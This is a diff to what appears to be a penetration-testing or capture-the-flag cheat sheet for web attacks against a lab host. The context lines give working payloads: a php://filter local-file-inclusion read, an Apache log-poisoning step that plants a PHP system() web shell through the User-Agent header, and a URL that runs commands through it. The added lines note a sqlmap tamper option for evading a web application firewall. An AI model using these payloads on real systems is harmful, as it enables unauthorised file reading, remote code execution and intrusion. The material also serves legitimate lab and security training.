@@ -108,6 +108,10 @@ http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/.
 curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
+#### bypass waf sqlmap
+```
+--tamper=space2comment
+```
 ---
 ###  Encoding techniques:
 - [splitbrain](https://www.splitbrain.org/_static/ook/)
